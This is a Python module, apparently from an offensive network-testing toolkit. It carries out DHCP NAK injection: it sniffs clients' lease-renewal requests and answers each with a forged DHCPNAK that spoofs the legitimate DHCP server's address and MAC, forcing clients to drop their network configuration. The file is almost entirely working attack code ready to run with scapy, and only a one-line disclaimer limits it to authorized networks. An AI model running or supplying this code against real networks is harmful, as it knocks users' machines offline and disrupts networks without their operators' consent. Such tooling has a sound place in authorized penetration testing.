"""DHCP NAK injection: refuse a client's lease renewal in the legitimate server's name.

A client that holds a lease renews it with a DHCPREQUEST sent to the server that
granted it. The server answers with a DHCPACK, or with a DHCPNAK when the lease can
no longer be used. A client that receives a DHCPNAK must stop using its address and
start again from DHCPDISCOVER.

This module answers each DHCPREQUEST addressed to the legitimate server with a
DHCPNAK that uses the server's address and MAC, copied by the operator. The NAK
carries the request's transaction ID. Clients that accept it drop their
configuration. Messages are not authenticated, so a NAK from an unexpected host is
accepted when the client does not check its source.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import BOOTP, DHCP, IP, UDP, AsyncSniffer, Ether, sendp
from scapy.packet import Packet

from macabre.attacks.common import BROADCAST_MAC, normalize_unicast_mac

SERVER_PORT = 67
CLIENT_PORT = 68
BROADCAST_IP = "255.255.255.255"
_MESSAGE_TYPE_NAMES = {1: "discover", 2: "offer", 3: "request", 5: "ack", 6: "nak"}


@dataclass(frozen=True)
class NakInjectionConfig:
    iface: str                       # attacker interface, on the segment with the clients
    server_ip: str                   # the legitimate server's address (copied into the NAK)
    server_mac: str                  # the legitimate server's MAC (copied; required)
    target_mac: str = ""             # only refuse this client; empty = refuse every client
    dry_run: bool = False

    def __post_init__(self) -> None:
        try:
            ipaddress.IPv4Address(self.server_ip)
        except ValueError as exc:
            raise ValueError("Server address must be an IPv4 address.") from exc
        if not self.server_mac:
            raise ValueError("The legitimate server's MAC is required: copy it from its traffic.")
        normalize_unicast_mac(self.server_mac)
        if self.target_mac:
            normalize_unicast_mac(self.target_mac)


@dataclass
class NakInjectionStats:
    requests: int = 0                # client requests addressed to the server
    naks: int = 0                    # NAKs sent
    status: str = ""


def _message_type(packet: Packet) -> Any:
    value = _option(packet, "message-type")
    if isinstance(value, int):
        return _MESSAGE_TYPE_NAMES.get(value, value)
    return value


def _option(packet: Packet, name: str) -> Any:
    for option in packet[DHCP].options:
        if isinstance(option, tuple) and len(option) == 2 and option[0] == name:
            return option[1]
    return None


def _targeted(packet: Packet, target_mac: str) -> bool:
    if not target_mac:
        return True
    return packet[BOOTP].chaddr[:6].hex(":") == normalize_unicast_mac(target_mac)


def is_addressed_to_server(packet: Packet, server_ip: str) -> bool:
    """A REQUEST that names this server, or a renewal or reboot request sent to it.

    A REQUEST with a server identifier belongs to that server's selection, so it is
    addressed to the server only when the identifier matches. A REQUEST without one is
    a renewal (unicast to the server) or a reboot (broadcast), and it is answered too.
    """
    server_id = _option(packet, "server_id")
    if server_id is not None:
        return server_id == server_ip
    return packet[IP].dst in (server_ip, BROADCAST_IP)


def build_nak(config: NakInjectionConfig, server_mac: str, request: Packet) -> Packet:
    """DHCPNAK answering `request`, from the legitimate server's address and MAC."""
    bootp = request[BOOTP]
    return (
        Ether(src=normalize_unicast_mac(server_mac), dst=BROADCAST_MAC)
        / IP(src=config.server_ip, dst=BROADCAST_IP)
        / UDP(sport=SERVER_PORT, dport=CLIENT_PORT)
        / BOOTP(op=2, xid=bootp.xid, chaddr=bootp.chaddr, flags=bootp.flags)
        / DHCP(options=[
            ("message-type", "nak"),
            ("server_id", config.server_ip),
            "end",
        ])
    )


def respond(config: NakInjectionConfig, server_mac: str, packet: Packet) -> Packet | None:
    """Return the NAK for a client REQUEST addressed to the server, otherwise None."""
    if not (packet.haslayer(DHCP) and packet.haslayer(BOOTP)):
        return None
    if packet[BOOTP].op != 1 or packet.src == normalize_unicast_mac(server_mac):
        return None
    if _message_type(packet) != "request":
        return None
    if not _targeted(packet, config.target_mac):
        return None
    if not is_addressed_to_server(packet, config.server_ip):
        return None
    return build_nak(config, server_mac, packet)


def run_nak_injection(
    config: NakInjectionConfig,
    stop_event: threading.Event,
    on_progress: Callable[[NakInjectionStats], None],
    send: Callable[..., Any] | None = None,
    sniffer_factory: Callable[..., Any] = AsyncSniffer,
) -> NakInjectionStats:
    """Refuse client requests in the server's name until `stop_event` is set."""
    send = send or sendp

    if config.dry_run:
        target = config.target_mac or "every client"
        stats = NakInjectionStats(
            status=(
                f"Dry run: would send DHCPNAK for {target} in the name of {config.server_ip} "
                f"({config.server_mac}) to each renewal request. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    server_mac = normalize_unicast_mac(config.server_mac)
    stats = NakInjectionStats()
    lock = threading.Lock()

    def on_packet(packet: Packet) -> None:
        if not (packet.haslayer(DHCP) and packet.haslayer(BOOTP)):
            return
        if packet[BOOTP].op != 1 or _message_type(packet) != "request":
            return
        if not _targeted(packet, config.target_mac) or not is_addressed_to_server(packet, config.server_ip):
            return
        with lock:
            stats.requests += 1
        nak = respond(config, server_mac, packet)
        if nak is None:
            return
        with lock:
            stats.naks += 1
            snapshot = replace(stats)
        send(nak, iface=config.iface, verbose=False)
        on_progress(snapshot)

    sniffer = sniffer_factory(iface=config.iface, store=False, prn=on_packet)
    sniffer.start()
    try:
        stop_event.wait()
    finally:
        sniffer.stop()
    return stats
